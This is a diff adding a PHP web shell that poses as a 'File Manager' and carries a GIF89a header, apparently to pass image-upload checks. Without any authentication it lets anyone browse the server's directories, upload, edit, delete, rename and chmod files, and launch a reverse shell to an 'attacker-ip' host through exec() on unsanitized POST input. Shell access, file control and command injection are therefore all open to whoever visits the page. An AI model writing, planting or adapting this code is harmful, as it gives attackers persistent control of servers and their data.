@@ -1,0 +1,451 @@
+GIF89a
+
+<?php
+/* GIF89a */
+
+$home = $_SERVER['HOME'] ?? '/';
+$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
+if (!$path || !is_dir($path)) $path = getcwd();
+$uploadSuccess = false;
+$fileLink = '';
+$currentYear = date("Y");
+$editContent = '';
+$editTarget = '';
+
+function h($str) { return htmlspecialchars($str, ENT_QUOTES); }
+
+// Handle Upload
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_FILES['upload'])) {
+        $dest = $path . '/' . basename($_FILES['upload']['name']);
+        if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
+            $uploadSuccess = true;
+            $fileLink = basename($dest);
+        }
+    } elseif (isset($_POST['chmod'], $_POST['file'])) {
+        chmod($path . '/' . $_POST['file'], intval($_POST['chmod'], 8));
+    } elseif (isset($_POST['savefile'], $_POST['filename'])) {
+        file_put_contents($path . '/' . $_POST['filename'], $_POST['savefile']);
+    } elseif (isset($_POST['rename'], $_POST['oldname'])) {
+        rename($path . '/' . $_POST['oldname'], $path . '/' . $_POST['rename']);
+    } elseif (isset($_POST['reverse_host'], $_POST['reverse_port'])) {
+        // Reverse shell handler
+        $host = $_POST['reverse_host'];
+        $port = (int)$_POST['reverse_port'];
+        $shell = isset($_POST['reverse_shell']) ? $_POST['reverse_shell'] : '/bin/sh';
+        
+        // Execute reverse shell in background
+        $cmd = "php -r '\$s=fsockopen(\"$host\",$port);"
+              . "system(\"$shell <&3 >&3 2>&3\");' > /dev/null 2>&1 &";
+        exec($cmd);
+    }
+}
+
+// Handle Edit
+if (isset($_GET['edit'])) {
+    $editTarget = basename($_GET['edit']);
+    $editPath = $path . '/' . $editTarget;
+    if (is_file($editPath)) {
+        $editContent = htmlspecialchars(file_get_contents($editPath));
+    }
+}
+
+// Handle Delete
+if (isset($_GET['delete'])) {
+    $target = $path . '/' . basename($_GET['delete']);
+    if (is_file($target)) {
+        unlink($target);
+        header("Location: ?path=" . urlencode($path));
+        exit;
+    }
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>File Manager</title>
+    <style>
+        /* Comic Sans MS Font Family */
+        body, input, button, textarea, select, table, h1, h2, h3, h4, h5, h6 {
+            font-family: 'Comic Sans MS', 'Comic Sans', cursive, sans-serif;
+        }
+        
+        body { 
+            background: #0a0f1a; 
+            color: #f0f8ff; 
+            padding: 20px;
+            background-image: radial-gradient(circle at 10% 20%, #1a2a6c 0%, #0a0f1a 90%);
+        }
+        a { 
+            color: #ff6ec7; 
+            text-decoration: none; 
+            transition: all 0.3s;
+        }
+        a:hover { 
+            color: #ff9ad5; 
+            text-decoration: underline; 
+            text-shadow: 0 0 5px rgba(255, 110, 199, 0.5);
+        }
+        table { 
+            width: 100%; 
+            border-collapse: collapse; 
+            margin-top: 15px; 
+            background: rgba(16, 22, 40, 0.8); 
+            border: 1px solid #334155;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
+        }
+        th, td { 
+            padding: 10px 15px; 
+            border: 1px solid #2d3b55; 
+            text-align: left; 
+        }
+        th { 
+            background: rgba(42, 67, 101, 0.8); 
+            color: #e0f7fa; 
+            text-shadow: 0 1px 1px #000;
+        }
+        tr:nth-child(even) { 
+            background: rgba(20, 30, 48, 0.6); 
+        }
+        tr:hover {
+            background: rgba(50, 80, 120, 0.4);
+        }
+        input, button, textarea, select {
+            background: rgba(16, 22, 40, 0.8); 
+            color: #f0f8ff; 
+            border: 1px solid #445577; 
+            padding: 8px 15px;
+            border-radius: 6px; 
+            margin: 6px 0;
+            font-size: 15px;
+            transition: all 0.3s;
+        }
+        input:focus, textarea:focus, select:focus {
+            border-color: #ff6ec7;
+            box-shadow: 0 0 8px rgba(255, 110, 199, 0.4);
+            outline: none;
+        }
+        button { 
+            background: linear-gradient(to bottom, #ff6ec7, #d741a7); 
+            color: #fff; 
+            font-weight: bold; 
+            cursor: pointer; 
+            border: none;
+            text-shadow: 0 1px 1px rgba(0,0,0,0.4);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+        button:hover { 
+            background: linear-gradient(to bottom, #ff9ad5, #ff6ec7); 
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.4);
+        }
+        .breadcrumb a { 
+            color: #a0d2eb; 
+            margin-right: 3px; 
+        }
+        .breadcrumb span { 
+            color: #5d7a9c; 
+            margin: 0 4px; 
+        }
+        .card { 
+            background: rgba(16, 22, 40, 0.8); 
+            padding: 20px; 
+            border-radius: 10px; 
+            border: 1px solid #334155;
+            margin-top: 20px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(4px);
+        }
+        textarea { 
+            width: 100%; 
+            height: 300px; 
+            margin-top: 10px; 
+        }
+        footer { 
+            text-align: center; 
+            margin-top: 40px; 
+            color: #5d7a9c; 
+            font-size: 0.9em; 
+            text-shadow: 0 1px 1px #000;
+        }
+        h2 { 
+            color: #ff6ec7; 
+            border-bottom: 2px solid #445577; 
+            padding-bottom: 12px; 
+            text-shadow: 0 2px 3px rgba(0,0,0,0.5);
+            font-size: 28px;
+        }
+        .success { 
+            color: #7fffd4; 
+            background: rgba(0, 100, 80, 0.3); 
+            padding: 12px; 
+            border-radius: 6px; 
+            border: 1px solid #00cc99;
+            margin-top: 15px;
+        }
+        .form-row { 
+            margin-bottom: 15px; 
+        }
+        .form-row label { 
+            display: block; 
+            margin-bottom: 8px; 
+            color: #a0d2eb; 
+            font-weight: bold;
+        }
+        .reverse-shell { 
+            border-left: 4px solid #ff6ec7; 
+        }
+        .dir-item { 
+            font-weight: bold; 
+            color: #ffb6c1; 
+        }
+        .file-item { 
+            color: #e0f7fa; 
+        }
+        .dir-item:before { 
+            content: "📂 "; 
+            color: #ff6ec7;
+        }
+        .actions { 
+            display: flex; 
+            gap: 8px; 
+            flex-wrap: wrap; 
+        }
+        .action-btn { 
+            background: rgba(42, 67, 101, 0.8); 
+            color: #e0f7fa; 
+            border: 1px solid #445577; 
+            padding: 5px 12px; 
+            border-radius: 5px; 
+            font-size: 14px; 
+            text-decoration: none; 
+            cursor: pointer;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+        }
+        .action-btn:hover { 
+            background: rgba(60, 90, 140, 0.8); 
+            transform: translateY(-2px);
+            box-shadow: 0 3px 6px rgba(0,0,0,0.3);
+        }
+        .toggle-header { 
+            cursor: pointer; 
+            display: flex; 
+            justify-content: space-between;
+            align-items: center; 
+            padding: 12px 18px; 
+            background: rgba(42, 67, 101, 0.8);
+            border-radius: 8px; 
+            margin: -20px -20px 20px -20px;
+            border-bottom: 2px solid #445577;
+        }
+        .toggle-header h3 { 
+            margin: 0; 
+            color: #ffb6c1;
+            text-shadow: 0 1px 1px #000;
+        }
+        .toggle-icon { 
+            transition: transform 0.3s; 
+            color: #ff6ec7;
+            font-size: 20px;
+        }
+        .collapsed .toggle-icon { 
+            transform: rotate(180deg); 
+        }
+        .collapsed .toggle-content { 
+            display: none; 
+        }
+        .signature { 
+            position: fixed; 
+            bottom: 15px; 
+            right: 20px; 
+            font-size: 20px; 
+            color: #ff6ec7; 
+            opacity: 0.75;
+            font-weight: bold;
+            text-shadow: 0 0 10px rgba(255, 110, 199, 0.8);
+            transform: rotate(-5deg);
+            z-index: 1000;
+            transition: all 0.5s;
+        }
+        .signature:hover { 
+            opacity: 1;
+            transform: rotate(0deg) scale(1.1);
+            text-shadow: 0 0 20px rgba(255, 110, 199, 1);
+        }
+        .header-glow {
+            text-shadow: 0 0 10px rgba(255, 110, 199, 0.7);
+        }
+    </style>
+    <script>
+        function toggleCollapse(element) {
+            element.parentElement.classList.toggle('collapsed');
+        }
+    </script>
+</head>
+<body>
+
+<h2 class="header-glow">File Manager</h2>
+
+<!-- Change Directory -->
+<form method="get">
+    <div class="form-row">
+        <label>Current Directory:</label>
+        <input type="text" name="path" value="<?= h($path) ?>" style="width:70%;">
+        <button type="submit">Go</button>
+    </div>
+</form>
+
+<!-- Breadcrumbs -->
+<div class="breadcrumb">
+    <?php
+    $crumbs = explode('/', trim($path, '/'));
+    $accum = '';
+    echo '<a href="?path=/">/</a>';
+    foreach ($crumbs as $crumb) {
+        $accum .= '/' . $crumb;
+        echo '<span>/</span><a href="?path=' . urlencode($accum) . '">' . h($crumb) . '</a>';
+    }
+    echo '<span>/</span><a href="?path=' . urlencode($home) . '">[ HOME ]</a>';
+    ?>
+</div>
+
+<!-- Parent Dir -->
+<?php if (dirname($path) !== $path): ?>
+<p><a href="?path=<?= urlencode(dirname($path)) ?>" class="action-btn">Parent Directory</a></p>
+<?php endif; ?>
+
+<!-- Upload -->
+<div class="card">
+    <form method="post" enctype="multipart/form-data">
+        <div class="form-row">
+            <label>Upload File:</label>
+            <input type="file" name="upload" required>
+            <button type="submit">Upload</button>
+        </div>
+    </form>
+    <?php if ($fileLink): ?>
+        <div class="success">File uploaded successfully: <a href="<?= h($fileLink) ?>" target="_blank"><?= h($fileLink) ?></a></div>
+    <?php endif; ?>
+</div>
+
+<!-- Reverse Shell - Collapsible Section -->
+<div class="card reverse-shell collapsed">
+    <div class="toggle-header" onclick="toggleCollapse(this)">
+        <h3>Reverse Shell Connection</h3>
+        <div class="toggle-icon">▼</div>
+    </div>
+    
+    <div class="toggle-content">
+        <form method="post">
+            <div class="form-row">
+                <label>Host:</label>
+                <input type="text" name="reverse_host" placeholder="attacker-ip" required>
+            </div>
+            
+            <div class="form-row">
+                <label>Port:</label>
+                <input type="number" name="reverse_port" placeholder="4444" required>
+            </div>
+            
+            <div class="form-row">
+                <label>Shell Type:</label>
+                <select name="reverse_shell">
+                    <option value="/bin/sh">/bin/sh</option>
+                    <option value="/bin/bash">/bin/bash</option>
+                    <option value="cmd.exe">cmd.exe (Windows)</option>
+                    <option value="powershell">PowerShell</option>
+                </select>
+            </div>
+            
+            <button type="submit">Connect Reverse Shell</button>
+        </form>
+    </div>
+</div>
+
+<!-- Edit File -->
+<?php if ($editTarget): ?>
+<div class="card">
+    <h3>Editing: <?= h($editTarget) ?></h3>
+    <form method="post">
+        <input type="hidden" name="filename" value="<?= h($editTarget) ?>">
+        <textarea name="savefile"><?= $editContent ?></textarea><br>
+        <button type="submit">Save Changes</button>
+    </form>
+</div>
+<?php endif; ?>
+
+<!-- File List -->
+<div class="card">
+    <table>
+        <tr>
+            <th>Name</th><th>Size (kB)</th><th>Modified</th><th>Perms</th><th>Actions</th>
+        </tr>
+        <?php
+        $items = scandir($path);
+        $dirs = $files = [];
+
+        foreach ($items as $item) {
+            if ($item === '.') continue;
+            if (is_dir($path . '/' . $item)) {
+                $dirs[] = $item;
+            } else {
+                $files[] = $item;
+            }
+        }
+
+        $all = array_merge($dirs, $files);
+
+        foreach ($all as $item) {
+            $full = $path . '/' . $item;
+            $isDir = is_dir($full);
+            $perm = substr(sprintf('%o', fileperms($full)), -4);
+            $mtime = filemtime($full);
+            $size = $isDir ? '-' : round(filesize($full) / 1024, 2);
+            $date = date("Y-m-d H:i", $mtime);
+
+            echo '<tr>';
+            echo '<td class="' . ($isDir ? 'dir-item' : 'file-item') . '">';
+            if ($isDir) {
+                echo '<a href="?path=' . urlencode($full) . '">' . h($item) . '</a>';
+            } else {
+                echo h($item);
+            }
+            echo '</td>';
+            echo "<td>$size</td><td>$date</td>";
+            echo '<td>
+                <form method="post" style="display:inline;">
+                    <input type="hidden" name="file" value="' . h($item) . '">
+                    <input type="text" name="chmod" value="' . $perm . '" size="4">
+                    <button>Set</button>
+                </form>
+            </td>';
+            echo '<td class="actions">';
+            if (!$isDir) {
+                echo '<a href="?path=' . urlencode($path) . '&edit=' . urlencode($item) . '" class="action-btn">Edit</a>';
+                echo '<a href="?path=' . urlencode($path) . '&delete=' . urlencode($item) . '" onclick="return confirm(\'Delete this file?\')" class="action-btn">Delete</a>';
+                echo '<a href="' . h($item) . '" download class="action-btn">Download</a>';
+                echo '<form method="post" style="display:inline;">
+                        <input type="hidden" name="oldname" value="' . h($item) . '">
+                        <input type="text" name="rename" value="' . h($item) . '" size="12">
+                        <button class="action-btn">Rename</button>
+                    </form>';
+            } else {
+                echo '-';
+            }
+            echo '</td></tr>';
+        }
+        ?>
+    </table>
+</div>
+
+<footer>
+    © <?= $currentYear ?> | File Manager
+</footer>
+
+<div class="signature">FlashKiss</div>
+
+</body>
+</html>
